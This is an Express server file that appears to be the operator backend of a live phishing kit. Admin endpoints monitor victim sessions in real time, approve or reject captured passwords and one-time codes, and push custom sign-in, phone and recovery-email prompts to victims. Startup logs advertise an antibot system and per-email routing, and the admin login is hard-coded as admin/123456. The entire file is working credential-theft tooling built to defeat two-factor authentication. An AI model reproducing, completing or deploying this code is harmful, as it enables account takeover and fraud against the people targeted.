app.use('/pages/res', express.static('public/pages/res'));

// Admin routes with authentication
app.post('/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === 'admin' && password === '123456') {
        req.session.is_admin = true;
        req.session.adminLoginTime = Date.now();
        req.session.lastAccess = Date.now();
        adminSessions.add(req.sessionId);
        sessionStore.set(req.sessionId, req.session);
        res.json({ success: true });
    } else {
        res.json({ success: false, error: 'Invalid credentials' });
    }
});

// Enhanced middleware to check admin authentication
function requireAdmin(req, res, next) {
    if (!req.session || !req.session.is_admin || !adminSessions.has(req.sessionId)) {
        return res.status(401).json({ success: false, error: 'Not authenticated' });
    }
    
    // Check admin session timeout
    const now = Date.now();
    if (now - req.session.lastAccess > ADMIN_SESSION_TIMEOUT) {
        req.session.is_admin = false;
        adminSessions.delete(req.sessionId);
        return res.status(401).json({ success: false, error: 'Session expired' });
    }
    
    // Update last access
    req.session.lastAccess = now;
    sessionStore.set(req.sessionId, req.session);
    next();
}

// Admin API routes - replicate all PHP admin functionality
app.get('/admin/api/poll_sessions', requireAdmin, (req, res) => {
    try {
        const storage = readStorage();
        // Enhanced session data with timing information
        const enhancedSessions = storage.sessions.map(session => {
            const currentTime = Math.floor(Date.now() / 1000);
            const timeSinceUpdate = session.last_update ? currentTime - session.last_update : 0;
            const timeSinceLastSeen = session.last_seen ? currentTime - session.last_seen : 0;
            
            return {
                ...session,
                time_since_update: timeSinceUpdate,
                time_since_last_seen: timeSinceLastSeen,
                is_online: timeSinceLastSeen < 15 // Consider online if seen within 15 seconds
            };
        });
        res.json({ sessions: enhancedSessions });
    } catch (error) {
        res.json({ sessions: [] });
    }
});

app.post('/admin/api/update_status', requireAdmin, (req, res) => {
    const { session_id, status } = req.body;
    updateSessionStatus(session_id, status, 'admin');
    res.json({ success: true });
});

app.post('/admin/api/block_ip', requireAdmin, (req, res) => {
    const { ip } = req.body;
    const success = blockIP(ip);
    res.json({ success });
});

app.post('/admin/api/delete_session', requireAdmin, (req, res) => {
    const { session_id } = req.body;
    try {
        deleteSession(session_id);
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false });
    }
});

app.post('/admin/api/delete_all_sessions', requireAdmin, (req, res) => {
    try {
        deleteAllSessions();
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false });
    }
});



app.post('/admin/api/update_sign_in_request_question', requireAdmin, (req, res) => {
    const { session_id, question1, question2 } = req.body;
    
    if (!session_id) {
        return res.json({ success: false, error: 'Missing session_id' });
    }
    
    // Update session fields like PHP does
    updateSessionField(session_id, 'sign_in_question1', question1);
    updateSessionField(session_id, 'sign_in_question2', question2 || 'phone');
    
    // Set status to sign_in_request when admin sends questions
    updateSessionStatus(session_id, 'sign_in_request', 'admin');
    
    res.json({ success: true });
});

app.post('/admin/api/update_recovery_email_sign_in_request_question', requireAdmin, (req, res) => {
    const { session_id, question1, question2 } = req.body;
    
    if (!session_id) {
        return res.json({ success: false, error: 'Missing session_id' });
    }
    
    // Update session fields for recovery email sign-in request
    updateSessionField(session_id, 'recovery_email_sign_in_question1', question1);
    updateSessionField(session_id, 'recovery_email_sign_in_question2', question2 || 'phone');
    
    // Set status to recovery_email_sign_in_request when admin sends questions
    updateSessionStatus(session_id, 'recovery_email_sign_in_request', 'admin');
    
    res.json({ success: true });
});

// Fix the phone otp question endpoint to match what the admin panel expects
app.post('/admin/api/update_phone_otp_question', requireAdmin, (req, res) => {
    const { session_id, question } = req.body;
    
    if (!session_id || !question) {
        return res.json({ success: false, error: 'Missing parameters' });
    }
    
    // Update session field and set status
    updateSessionField(session_id, 'phone_otp_question', question);
    updateSessionStatus(session_id, 'phone_otp', 'admin');
    
    res.json({ success: true });
});

app.get('/admin/api/blocked_ips', requireAdmin, (req, res) => {
    try {
        const blocked = JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE, 'utf8'));
        res.json(blocked);
    } catch (error) {
        res.json([]);
    }
});

app.post('/admin/api/unblock_ip', requireAdmin, (req, res) => {
    const { ip } = req.body;
    
    if (!ip) {
        return res.json({ success: false, error: 'Missing IP' });
    }
    
    try {
        const blocked = JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE, 'utf8'));
        const newBlocked = blocked.filter(blockedIp => blockedIp !== ip);
        fs.writeFileSync(BLOCKED_IPS_FILE, JSON.stringify(newBlocked, null, 2));
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false, error: 'Failed to unblock IP' });
    }
});

// Additional admin endpoints from PHP version
app.post('/admin/api/approve_password', requireAdmin, (req, res) => {
    const { session_id } = req.body;
    
    if (!session_id) {
        return res.json({ success: false, error: 'Missing session_id' });
    }
    
    const session = getSession(session_id);
    if (!session) {
        return res.json({ success: false, error: 'Session not found' });
    }
    
    updateSessionStatus(session_id, 'phone', 'admin');
    res.json({ success: true });
});

app.post('/admin/api/reject_password', requireAdmin, (req, res) => {
    const { session_id } = req.body;
    
    if (!session_id) {
        return res.json({ success: false, error: 'Missing session_id' });
    }
    
    const session = getSession(session_id);
    if (!session) {
        return res.json({ success: false, error: 'Session not found' });
    }
    
    updateSessionStatus(session_id, 'wrong_password', 'admin');
    res.json({ success: true });
});

app.post('/admin/api/approve_otp', requireAdmin, (req, res) => {
    const { session_id } = req.body;
    
    if (!session_id) {
        return res.json({ success: false, error: 'Missing session_id' });
    }
    
    const session = getSession(session_id);
    if (!session) {
        return res.json({ success: false, error: 'Session not found' });
    }
    
    updateSessionStatus(session_id, 'success', 'admin');
    res.json({ success: true });
});

app.post('/admin/api/reject_otp', requireAdmin, (req, res) => {
    const { session_id } = req.body;
    
    if (!session_id) {
        return res.json({ success: false, error: 'Missing session_id' });
    }
    
    const session = getSession(session_id);
    if (!session) {
        return res.json({ success: false, error: 'Session not found' });
    }
    
    updateSessionStatus(session_id, 'wrong-phone_otp', 'admin');
    res.json({ success: true });
});

// Admin endpoint to set recovery email and redirect user
app.post('/admin/api/set_recovery_email', requireAdmin, (req, res) => {
    const { session_id, recovery_email } = req.body;
    
    if (!session_id || !recovery_email) {
        return res.json({ success: false, error: 'Missing parameters' });
    }
    
    const session = getSession(session_id);
    if (!session) {
        return res.json({ success: false, error: 'Session not found' });
    }
    
    updateSessionField(session_id, 'recovery_email', recovery_email);
    updateSessionStatus(session_id, 'recovery_email', 'admin');
    
    res.json({ success: true });
});

// Admin endpoint to reject recovery email OTP
app.post('/admin/api/reject_recovery_email_otp', requireAdmin, (req, res) => {
    const { session_id } = req.body;
    
    if (!session_id) {
        return res.json({ success: false, error: 'Missing session_id' });
    }
    
    const session = getSession(session_id);
    if (!session) {
        return res.json({ success: false, error: 'Session not found' });
    }
    
    updateSessionStatus(session_id, 'wrong_recovery_email_otp', 'admin');
    res.json({ success: true });
});

// Admin panel routes
app.get('/admin', (req, res) => {
    if (!req.session || !req.session.is_admin) {
        return res.redirect('/admin/login.html');
    }
    res.sendFile(path.join(__dirname, 'admin', 'index.html'));
});

app.get('/admin/', (req, res) => {
    if (!req.session || !req.session.is_admin) {
        return res.redirect('/admin/login.html');
    }
    res.sendFile(path.join(__dirname, 'admin', 'index.html'));
});

app.get('/admin/login.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin', 'login.html'));
});

app.get('/admin/login', (req, res) => {
    res.redirect('/admin/login.html');
});

app.get('/admin/index.html', (req, res) => {
    if (!req.session || !req.session.is_admin) {
        return res.redirect('/admin/login.html');
    }
    res.sendFile(path.join(__dirname, 'admin', 'index.html'));
});

app.post('/admin/logout', (req, res) => {
    if (req.session) {
        req.session.is_admin = false;
    }
    res.json({ success: true });
});

const HOST = '0.0.0.0';

const server = app.listen(PORT, HOST, () => {
    console.log(`Server running on ${HOST}:${PORT}`);
    console.log('✓ All PHP functionality migrated to Node.js/Express');
    console.log('✓ Antibot system active with complete protection');
    console.log('✓ Session management using PHP-compatible storage format');
    console.log('✓ Admin panel with secure authentication');
    console.log('✓ No PHP source code exposed - secure deployment');
    console.log('✓ Health check available at /health');
    console.log('✓ Hash-based email routing enabled (#email@domain.com)');
    console.log('✓ Docker ready for deployment');
});

// Graceful shutdown handling
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    server.close(() => {
        console.log('Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('SIGINT received, shutting down gracefully');
    server.close(() => {
        console.log('Server closed');
        process.exit(0);
    });
});